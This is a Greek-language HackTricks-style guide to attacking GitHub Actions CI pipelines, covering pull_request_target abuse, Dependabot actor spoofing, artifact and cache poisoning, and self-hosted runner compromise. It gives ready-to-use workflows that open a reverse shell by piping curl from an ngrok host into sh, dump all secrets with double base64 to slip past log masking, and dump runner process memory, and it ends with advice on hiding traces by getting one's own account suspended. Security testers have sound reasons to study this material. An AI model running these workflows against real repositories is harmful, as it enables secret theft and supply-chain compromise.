# Κατάχρηση Github Actions

{{#include ../../../banners/hacktricks-training.md}}

## Εργαλεία

Τα ακόλουθα εργαλεία είναι χρήσιμα για να βρείτε Github Action workflows και ακόμη και ευάλωτα:

- [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
- [https://github.com/praetorian-inc/gato](https://github.com/praetorian-inc/gato)
- [https://github.com/AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X)
- [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)
- [https://github.com/zizmorcore/zizmor](https://github.com/zizmorcore/zizmor) - Ελέγξτε επίσης το checklist του σε [https://docs.zizmor.sh/audits](https://docs.zizmor.sh/audits)

## Βασικές Πληροφορίες

Σε αυτή τη σελίδα θα βρείτε:

- Μια **περίληψη όλων των επιπτώσεων** όταν ένας επιτιθέμενος καταφέρει να αποκτήσει πρόσβαση σε ένα Github Action
- Διάφοροι τρόποι για να **αποκτήσετε πρόσβαση σε ένα action**:
- Έχοντας **δικαιώματα** για να δημιουργήσετε το action
- Κατάχρηση **pull request** related triggers
- Κατάχρηση **άλλων τεχνικών εξωτερικής πρόσβασης**
- **Pivoting** από ένα ήδη συμβιβασμένο repo
- Τέλος, μια ενότητα για τις τεχνικές **post-exploitation** για κατάχρηση ενός action από μέσα (για να προκαλέσει τις προαναφερθείσες επιπτώσεις)

## Περίληψη Επιπτώσεων

Για μια εισαγωγή σχετικά με [**Github Actions check the basic information**](../basic-github-information.md#github-actions).

Αν μπορείτε να **εκτελέσετε αυθαίρετο κώδικα σε GitHub Actions** μέσα σε ένα **repository**, μπορεί να είστε σε θέση να:

- **Κλέψετε μυστικά** που είναι προσαρτημένα στο pipeline και **καταχραστείτε τα προνόμια του pipeline** για να αποκτήσετε μη εξουσιοδοτημένη πρόσβαση σε εξωτερικές πλατφόρμες, όπως AWS και GCP.
- **Συμβιβάσετε deployments** και άλλα **artifacts**.
- Εάν το pipeline αναπτύσσει ή αποθηκεύει assets, θα μπορούσατε να αλλοιώσετε το τελικό προϊόν, επιτρέποντας επίθεση supply chain.
- **Εκτελέσετε κώδικα σε custom workers** για να καταχραστείτε υπολογιστική ισχύ και να pivot σε άλλα συστήματα.
- **Επαναγράψετε τον κώδικα του repository**, ανάλογα με τα permissions που συνδέονται με το `GITHUB_TOKEN`.

## GITHUB_TOKEN

Αυτό το "**secret**" (προερχόμενο από `${{ secrets.GITHUB_TOKEN }}` και `${{ github.token }}`) δίνεται όταν ο admin ενεργοποιήσει αυτή την επιλογή:

<figure><img src="../../../images/image (86).png" alt=""><figcaption></figcaption></figure>

This token is the same one a **Github Application will use**, so it can access the same endpoints: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

> [!WARNING]
> Github should release a [**flow**](https://github.com/github/roadmap/issues/74) that **allows cross-repository** access within GitHub, so a repo can access other internal repos using the `GITHUB_TOKEN`.

Μπορείτε να δείτε τα πιθανά **permissions** αυτού του token στο: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token)

Σημειώστε ότι το token **λήγει μετά την ολοκλήρωση της job**.\
Αυτά τα tokens μοιάζουν κάπως έτσι: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Κάποια ενδιαφέροντα πράγματα που μπορείτε να κάνετε με αυτό το token:

{{#tabs }}
{{#tab name="Merge PR" }}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header "content-type: application/json" \
-d "{\"commit_title\":\"commit_title\"}"
```
{{#endtab }}
{{#tab name="Approve PR" }}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{{#endtab }}
{{#tab name="Create PR" }}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{{#endtab }}
{{#endtabs }}

> [!CAUTION]
> Σημειώστε ότι σε πολλές περιπτώσεις θα μπορείτε να βρείτε **github user tokens inside Github Actions envs or in the secrets**. Αυτά τα tokens ενδέχεται να σας δώσουν περισσότερα προνόμια στο repository και στην organization.

<details>

<summary>Λίστα secrets στην έξοδο του Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Λήψη reverse shell με secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Είναι δυνατόν να ελέγξετε τα δικαιώματα που έχουν δοθεί σε ένα Github Token σε αποθετήρια άλλων χρηστών **ελέγχοντας τα logs** των actions:

<figure><img src="../../../images/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Επιτρεπόμενη Εκτέλεση

> [!NOTE]
> Αυτό θα ήταν ο ευκολότερος τρόπος για να compromise τα Github actions, καθώς αυτή η περίπτωση προϋποθέτει ότι έχετε πρόσβαση να **create a new repo in the organization**, ή έχετε **write privileges over a repository**.
>
> Εάν βρίσκεστε σε αυτό το σενάριο μπορείτε απλώς να ελέγξετε τα [Post Exploitation techniques](#post-exploitation-techniques-from-inside-an-action).

### Εκτέλεση από Δημιουργία repo

Σε περίπτωση που μέλη μιας οργάνωσης μπορούν να **create new repos** και μπορείτε να εκτελέσετε github actions, μπορείτε να **create a new repo and steal the secrets set at organization level**.

### Εκτέλεση από Νέο Branch

Αν μπορείτε να **create a new branch in a repository that already contains a Github Action** configured, μπορείτε να το **modify**, να **upload** το περιεχόμενο, και στη συνέχεια να **execute that action from the new branch**. Με αυτόν τον τρόπο μπορείτε να **exfiltrate repository and organization level secrets** (αλλά πρέπει να ξέρετε πώς ονομάζονται).

> [!WARNING]
> Οποιοσδήποτε περιορισμός που εφαρμόζεται μόνο μέσα στο workflow YAML (για παράδειγμα, `on: push: branches: [main]`, job conditionals, or manual gates) μπορεί να επεξεργαστεί από συνεργάτες. Χωρίς εξωτερική επιβολή (branch protections, protected environments, and protected tags), ένας συνεισφέρων μπορεί να επαναστοχεύσει ένα workflow ώστε να τρέξει στο branch του και να καταχραστεί mounted secrets/permissions.

Μπορείτε να κάνετε την τροποποιημένη action εκτελέσιμη **manually,** όταν ένα **PR is created** ή όταν **some code is pushed** (ανάλογα με το πόσο noisy θέλετε να είστε):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name
# Use '**' instead of a branh name to trigger the action in all the cranches
```
---

## Εκτέλεση από fork

> [!NOTE]
> Υπάρχουν διάφορα triggers που θα μπορούσαν να επιτρέψουν σε έναν επιτιθέμενο να **εκτελέσει ένα Github Action από άλλο repository**. Εάν αυτές οι ενεργοποιήσιμες ενέργειες είναι κακώς διαμορφωμένες, ένας επιτιθέμενος θα μπορούσε να καταφέρει να τις παραβιάσει.

### `pull_request`

Ο workflow trigger **`pull_request`** θα εκτελέσει το workflow κάθε φορά που λαμβάνεται ένα pull request με ορισμένες εξαιρέσεις: από προεπιλογή, αν είναι η **πρώτη φορά** που συνεργάζεστε, κάποιος **maintainer** θα χρειαστεί να **εγκρίνει** το **run** του workflow:

<figure><img src="../../../images/image (184).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Εφόσον ο **προεπιλεγμένος περιορισμός** αφορά τους **συνεισφέροντες για πρώτη φορά**, μπορείς να συνεισφέρεις **διόρθωση ενός έγκυρου bug/typo** και μετά να στείλεις **άλλα PRs για να καταχραστείς τα νέα σου `pull_request` προνόμια**.
>
> **Το δοκίμασα και δεν δουλεύει**: ~~Μία άλλη επιλογή θα ήταν να δημιουργήσεις έναν λογαριασμό με το όνομα κάποιου που συνέβαλε στο project και να διαγράψεις τον λογαριασμό του.~~

Επιπλέον, από προεπιλογή **αποτρέπει write permissions και access σε secrets** προς το target repository όπως αναφέρεται στα [**docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> With the exception of `GITHUB_TOKEN`, **secrets are not passed to the runner** when a workflow is triggered from a **forked** repository. The **`GITHUB_TOKEN` has read-only permissions** in pull requests **from forked repositories**.

Ένας επιτιθέμενος θα μπορούσε να τροποποιήσει τον ορισμό του Github Action για να εκτελέσει αυθαίρετα πράγματα και να προσθέσει αυθαίρετα actions. Ωστόσο, δεν θα μπορέσει να κλέψει secrets ή να υπεργράψει το repo λόγω των προαναφερθέντων περιορισμών.

> [!CAUTION]
> **Ναι, αν ο επιτιθέμενος αλλάξει στο PR το github action που θα ενεργοποιηθεί, το Github Action του θα είναι αυτό που θα χρησιμοποιηθεί και όχι αυτό από το origin repo!**

Καθώς ο επιτιθέμενος ελέγχει επίσης τον κώδικα που εκτελείται, ακόμα και αν δεν υπάρχουν secrets ή write permissions στο `GITHUB_TOKEN`, ο επιτιθέμενος θα μπορούσε για παράδειγμα να **ανεβάσει malicious artifacts**.

### **`pull_request_target`**

Ο workflow trigger **`pull_request_target`** έχει **write permission** στο target repository και **access σε secrets** (και δεν ζητάει άδεια).

Σημειώστε ότι ο workflow trigger **`pull_request_target`** **τρέχει στο base context** και όχι σε αυτό που δίνει το PR (για να **μην εκτελέσει untrusted code**). Για περισσότερες πληροφορίες για το `pull_request_target` [**check the docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target).\
Επιπλέον, για περισσότερες πληροφορίες σχετικά με αυτή τη συγκεκριμένη επικίνδυνη χρήση δείτε αυτό το [**github blog post**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Μπορεί να φαίνεται ότι επειδή το **εκτελούμενο workflow** είναι αυτό που ορίζεται στη **base** και **όχι στο PR**, είναι **ασφαλές** να χρησιμοποιήσεις **`pull_request_target`**, αλλά υπάρχουν μερικές **περιπτώσεις όπου δεν είναι**.

Και αυτή θα έχει **access σε secrets**.

### `workflow_run`

Ο [**workflow_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run) trigger επιτρέπει να τρέξει ένα workflow από ένα άλλο όταν είναι `completed`, `requested` ή `in_progress`.

Σε αυτό το παράδειγμα, ένα workflow έχει διαμορφωθεί να τρέχει αφού το ξεχωριστό "Run Tests" workflow ολοκληρωθεί:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Επιπλέον, σύμφωνα με την τεκμηρίωση: Η ροή εργασίας που ξεκινά από το γεγονός `workflow_run` μπορεί να **έχει πρόσβαση σε secrets και να γράφει tokens, ακόμα κι αν η προηγούμενη ροή εργασίας δεν είχε**.

Αυτός ο τύπος ροής εργασίας θα μπορούσε να δεχθεί επίθεση αν **εξαρτάται** από μια **ροή εργασίας** που μπορεί να **ενεργοποιηθεί** από έναν εξωτερικό χρήστη μέσω **`pull_request`** ή **`pull_request_target`**. A couple of vulnerable examples can be [**found this blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** Το πρώτο αφορά τη ροή εργασίας ενεργοποιούμενη από **`workflow_run`** που κατεβάζει τον κώδικα του επιτιθέμενου: `${{ github.event.pull_request.head.sha }}`\
Το δεύτερο αφορά στο **passing** ενός **artifact** από τον **untrusted** κώδικα στη ροή εργασίας **`workflow_run`** και στη χρήση του περιεχομένου αυτού του artifact με τρόπο που το καθιστά **vulnerable to RCE**.

### `workflow_call`

TODO

TODO: Check if when executed from a pull_request the used/downloaded code if the one from the origin or from the forked PR

## Κατάχρηση εκτέλεσης από Forks

Αναφέραμε όλους τους τρόπους με τους οποίους ένας εξωτερικός attacker θα μπορούσε να κάνει μια GitHub workflow να εκτελεστεί, τώρα ας δούμε πώς αυτές οι εκτελέσεις, αν είναι κακώς διαμορφωμένες, μπορούν να καταχραστούν:

### Untrusted checkout execution

Σε περίπτωση **`pull_request`**, η ροή εργασίας θα εκτελεστεί στο **context του PR** (οπότε θα εκτελέσει τον **malicious PRs code**), αλλά κάποιος πρέπει να **το εξουσιοδοτήσει πρώτα** και θα τρέξει με κάποιους [limitations](#pull_request).

Σε περίπτωση ροής εργασίας που χρησιμοποιεί **`pull_request_target` or `workflow_run`** και εξαρτάται από μια ροή εργασίας που μπορεί να ενεργοποιηθεί από **`pull_request_target` or `pull_request`**, ο κώδικας από το αρχικό repo θα εκτελεστεί, οπότε ο **attacker cannot control the executed code**.

> [!CAUTION]
> Ωστόσο, αν το **action** έχει ένα **explicit PR checkou**t που θα **get the code from the PR** (και όχι από base), θα χρησιμοποιήσει τον κώδικα που ελέγχει ο attacker. Για παράδειγμα (έλεγχος γραμμής 12 όπου ο κώδικας του PR κατεβαίνει):

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Ο πιθανώς **untrusted κώδικας εκτελείται κατά τη διάρκεια των `npm install` ή `npm build`** καθώς τα build scripts και τα αναφερόμενα **packages ελέγχονται από τον author του PR**.

> [!WARNING]
> Ένας github dork για να ψάξετε για ευάλωτες actions είναι: `event.pull_request pull_request_target extension:yml` όμως υπάρχουν διαφορετικοί τρόποι να διαμορφώσετε τα jobs ώστε να εκτελούνται με ασφάλεια ακόμα κι αν το action είναι ανασφαλώς ρυθμισμένο (π.χ. χρησιμοποιώντας conditionals σχετικά με το ποιος είναι ο actor που δημιουργεί το PR).

### Ενέσεις Script στο Context <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Σημειώστε ότι υπάρχουν ορισμένα [**github contexts**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) των οποίων οι τιμές **ελέγχονται** από τον **user** που δημιουργεί το PR. Αν το github action χρησιμοποιεί αυτά τα **data για να εκτελέσει οτιδήποτε**, αυτό μπορεί να οδηγήσει σε **arbitrary code execution:**

{{#ref}}
gh-actions-context-script-injections.md
{{#endref}}

### **GITHUB_ENV Script Injection** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Από την τεκμηρίωση: Μπορείτε να κάνετε μια **environment variable διαθέσιμη σε οποιαδήποτε επόμενα βήματα** σε ένα workflow job ορίζοντας ή ενημερώνοντας την μεταβλητή περιβάλλοντος και γράφοντάς την στο **`GITHUB_ENV`** environment file.

Εάν ένας attacker μπορούσε να **inject οποιαδήποτε τιμή** μέσα σε αυτή την **env** μεταβλητή, θα μπορούσε να εισάγει env μεταβλητές που θα μπορούσαν να εκτελέσουν κώδικα σε επόμενα βήματα όπως **LD_PRELOAD** ή **NODE_OPTIONS**.

Για παράδειγμα ([**this**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) and [**this**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), φανταστείτε μια ροή εργασίας που εμπιστεύεται ένα uploaded artifact για να αποθηκεύσει το περιεχόμενό του μέσα στην **`GITHUB_ENV`** env μεταβλητή. Ένας attacker θα μπορούσε να ανεβάσει κάτι σαν το παρακάτω για να το παραβιάσει:

<figure><img src="../../../images/image (261).png" alt=""><figcaption></figcaption></figure>

### Dependabot and other trusted bots

Όπως υποδεικνύεται σε [**this blog post**](https://boostsecurity.io/blog/weaponizing-dependabot-pwn-request-at-its-finest), αρκετοί οργανισμοί έχουν μια Github Action που merges οποιοδήποτε PRR από `dependabot[bot]` όπως στο:
```yaml
on: pull_request_target
jobs:
auto-merge:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: gh pr merge $ -d -m
```
Which is a problem because the `github.actor` field contains the user who caused the latest event that triggered the workflow. And There are several ways to make the `dependabot[bot]` user to modify a PR. For example:

- Fork το repository του θύματος
- Πρόσθεσε το malicious payload στο αντίγραφό σου
- Ενεργοποίησε το Dependabot στο fork σου προσθέτοντας μια outdated dependency. Το Dependabot θα δημιουργήσει ένα branch που θα διορθώνει την εξάρτηση και θα περιέχει malicious code.
- Άνοιξε ένα Pull Request προς το repository του θύματος από αυτό το branch (το PR θα δημιουργηθεί από τον χρήστη οπότε ακόμα δεν θα γίνει τίποτα)
- Στη συνέχεια, ο attacker επιστρέφει στο αρχικό PR που άνοιξε το Dependabot στο fork του και τρέχει `@dependabot recreate`
- Έπειτα, το Dependabot εκτελεί κάποιες ενέργειες σε εκείνο το branch, που τροποποιούν το PR στο repository του θύματος, κάνοντας έτσι τον `dependabot[bot]` actor του τελευταίου γεγονότος που ενεργοποίησε το workflow (και επομένως, το workflow τρέχει).

Moving on, what if instead of merging the Github Action would have a command injection like in:
```yaml
on: pull_request_target
jobs:
just-printing-stuff:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: echo ${ { github.event.pull_request.head.ref }}
```
Well, the original blogpost proposes two options to abuse this behavior being the second one:

- Fork the victim repository and enable Dependabot with some outdated dependency.
- Create a new branch with the malicious shell injeciton code.
- Change the default branch of the repo to that one
- Create a PR from this branch to the victim repository.
- Run `@dependabot merge` in the PR Dependabot opened in his fork.
- Dependabot will merge his changes in the default branch of your forked repository, updating the PR in the victim repository making now the `dependabot[bot]` the actor of the latest event that triggered the workflow and using a malicious branch name.

### Ευάλωτες Third-Party Github Actions

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

As mentioned in [**this blog post**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), this Github Action allows to access artifacts from different workflows and even repositories.

Το πρόβλημα είναι ότι αν ο παράμετρος **`path`** δεν έχει οριστεί, το artifact εξάγεται στον τρέχοντα κατάλογο και μπορεί να αντικαταστήσει αρχεία που αργότερα θα μπορούσαν να χρησιμοποιηθούν ή ακόμα και να εκτελεστούν στο workflow. Επομένως, αν το Artifact είναι ευάλωτο, ένας επιτιθέμενος θα μπορούσε να το εκμεταλλευτεί για να συμβιβάσει άλλα workflows που εμπιστεύονται το Artifact.

Example of vulnerable workflow:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Αυτό θα μπορούσε να επιτεθεί με αυτή τη ροή εργασίας:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
---

## Άλλες Εξωτερικές Προσβάσεις

### Deleted Namespace Repo Hijacking

If an account changes it's name another user could register an account with that name after some time. If a repository had **less than 100 stars previously to the change of name**, Github will allow the new register user with the same name to create a **repository with the same name** as the one deleted.

> [!CAUTION]
> Έτσι, αν ένα action χρησιμοποιεί ένα repo από λογαριασμό που δεν υπάρχει, εξακολουθεί να είναι πιθανό ένας επιτιθέμενος να δημιουργήσει αυτόν τον λογαριασμό και να συμβιβάσει το action.

If other repositories were using **dependencies from this user repos**, an attacker will be able to hijack them. Here you have a more complete explanation: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

---

## Repo Pivoting

> [!NOTE]
> Σε αυτή την ενότητα θα μιλήσουμε για τεχνικές που θα επιτρέπουν να **pivot from one repo to another** υποθέτοντας ότι έχουμε κάποιο είδος πρόσβασης στο πρώτο (δείτε την προηγούμενη ενότητα).

### Cache Poisoning

A cache is maintained between **workflow runs in the same branch**. Which means that if an attacker **compromise** a **package** that is then stored in the cache and **downloaded** and executed by a **more privileged** workflow he will be able to **compromise** also that workflow.

{{#ref}}
gh-actions-cache-poisoning.md
{{#endref}}

### Artifact Poisoning

Workflows could use **artifacts from other workflows and even repos**, if an attacker manages to **compromise** the Github Action that **uploads an artifact** that is later used by another workflow he could **compromise the other workflows**:

{{#ref}}
gh-actions-artifact-poisoning.md
{{#endref}}

---

## Post Exploitation from an Action

### Github Action Policies Bypass

As commented in [**this blog post**](https://blog.yossarian.net/2025/06/11/github-actions-policies-dumb-bypass), even if a repository or organization has a policy restricting the use of certain actions, an attacker could just download (`git clone`) and action inside the workflow and then reference it as a local action. As the policies doesn't affect local paths, **the action will be executed without any restriction.**

Παράδειγμα:
```yaml
on: [push, pull_request]

jobs:
test:
runs-on: ubuntu-latest
steps:
- run: |
mkdir -p ./tmp
git clone https://github.com/actions/checkout.git ./tmp/checkout

- uses: ./tmp/checkout
with:
repository: woodruffw/gha-hazmat
path: gha-hazmat

- run: ls && pwd

- run: ls tmp/checkout
```
### Πρόσβαση σε AWS και GCP μέσω OIDC

Check the following pages:

{{#ref}}
../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md
{{#endref}}

{{#ref}}
../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md
{{#endref}}

### Πρόσβαση σε μυστικά <a href="#accessing-secrets" id="accessing-secrets"></a>

Αν εισάγετε περιεχόμενο σε ένα script, είναι χρήσιμο να γνωρίζετε πώς μπορείτε να αποκτήσετε πρόσβαση σε μυστικά:

- Αν το μυστικό ή το token έχει οριστεί ως **μεταβλητή περιβάλλοντος**, μπορεί να προσπελαστεί απευθείας μέσω του περιβάλλοντος χρησιμοποιώντας **`printenv`**.

<details>

<summary>Λίστα μυστικών στην έξοδο του Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Πάρτε reverse shell με secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

- Εάν το secret χρησιμοποιείται **απευθείας σε μια έκφραση**, το παραγόμενο shell script αποθηκεύεται **στο δίσκο** και είναι προσβάσιμο.
- ```bash
cat /home/runner/work/_temp/*
```
- Για JavaScript actions, τα secrets αποστέλλονται μέσω environment variables
- ```bash
ps axe | grep node
```
- Για μια **custom action**, ο κίνδυνος μπορεί να διαφέρει ανάλογα με το πώς ένα πρόγραμμα χρησιμοποιεί το secret που απέκτησε από το **argument**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

- Εξακριβώστε όλα τα secrets μέσω του secrets context (collaborator level). Ένας contributor με write access μπορεί να τροποποιήσει ένα workflow σε οποιοδήποτε branch για να αποστείλει (dump) όλα τα repository/org/environment secrets. Χρησιμοποιήστε double base64 για να αποφύγετε το GitHub’s log masking και αποκωδικοποιήστε το τοπικά:

```yaml
name: Steal secrets
on:
push:
branches: [ attacker-branch ]
jobs:
dump:
runs-on: ubuntu-latest
steps:
- name: Double-base64 the secrets context
run: |
echo '${{ toJson(secrets) }}' | base64 -w0 | base64 -w0
```

Αποκωδικοποιήστε το τοπικά:

```bash
echo "ZXdv...Zz09" | base64 -d | base64 -d
```

Tip: για stealth κατά τις δοκιμές, κρυπτογραφήστε πριν την εκτύπωση (openssl είναι προεγκατεστημένο στους GitHub-hosted runners).

### Κατάχρηση Self-hosted runners

Ο τρόπος για να βρείτε ποιες **Github Actions εκτελούνται σε υποδομή εκτός GitHub** είναι να αναζητήσετε **`runs-on: self-hosted`** στο Github Action configuration yaml.

Οι **Self-hosted** runners μπορεί να έχουν πρόσβαση σε **επιπλέον ευαίσθητες πληροφορίες**, σε άλλα **δικτυακά συστήματα** (ευάλωτα endpoints στο δίκτυο; metadata service?) ή, ακόμη και αν είναι απομονωμένος και θα καταστραφεί, **περισσότερες από μία action μπορεί να τρέχουν ταυτόχρονα** και η κακόβουλη θα μπορούσε να **steal the secrets** της άλλης.

Σε self-hosted runners είναι επίσης δυνατό να αποκτήσετε τα **secrets from the \_Runner.Listener**\_\*\* process\*\* τα οποία θα περιέχουν όλα τα secrets των workflows σε οποιοδήποτε βήμα, κάνοντας dump τη μνήμη του:
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
Δείτε [**this post for more information**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images Registry

Είναι δυνατό να δημιουργήσετε Github actions που θα **χτίσουν και θα αποθηκεύσουν ένα Docker image μέσα στο Github**.\
Ένα παράδειγμα υπάρχει στο παρακάτω αναδιπλούμενο:

<details>

<summary>Github Action Build & Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Όπως φαίνεται στον προηγούμενο κώδικα, το Github registry φιλοξενείται στο **`ghcr.io`**.

Ένας χρήστης με δικαιώματα ανάγνωσης στο repo θα μπορεί τότε να κατεβάσει το Docker Image χρησιμοποιώντας ένα personal access token:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Στη συνέχεια, ο χρήστης θα μπορούσε να αναζητήσει για **leaked secrets in the Docker image layers:**

{{#ref}}
https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics.html
{{#endref}}

### Ευαίσθητες πληροφορίες στα Github Actions logs

Ακόμα κι αν το **Github** προσπαθεί να **detect secret values** στα actions logs και να **avoid showing** αυτά, **other sensitive data** που μπορεί να έχει παραχθεί κατά την εκτέλεση της action δεν θα κρυφτεί. Για παράδειγμα ένα JWT signed with a secret value won't be hidden unless it's [specifically configured](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Covering your Tracks

(Technique from [**here**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Πρώτα απ' όλα, κάθε PR που υποβάλλεται είναι σαφώς ορατό στο κοινό στο Github και στον στοχευόμενο λογαριασμό GitHub. Στο GitHub εξ ορισμού, we **can’t delete a PR of the internet**, αλλά υπάρχει μια ανατροπή. Για λογαριασμούς Github που είναι **suspended** από Github, όλα τα **PRs are automatically deleted** και αφαιρούνται από το internet. Οπότε για να κρύψετε τη δραστηριότητά σας χρειάζεται είτε να κάνετε **GitHub account suspended or get your account flagged**. Αυτό θα **hide all your activities** στο GitHub από το internet (βασικά θα αφαιρέσει όλα τα exploit PR σας)

Μια οργάνωση στο GitHub είναι πολύ προδραστική στην αναφορά λογαριασμών στο GitHub. Το μόνο που χρειάζεται να κάνετε είναι να μοιραστείτε “some stuff” σε ένα Issue και θα φροντίσουν ο λογαριασμός σας να είναι suspended σε 12 ώρες :p και εκεί το έχετε, κάνατε το exploit σας αόρατο στο github.

> [!WARNING]
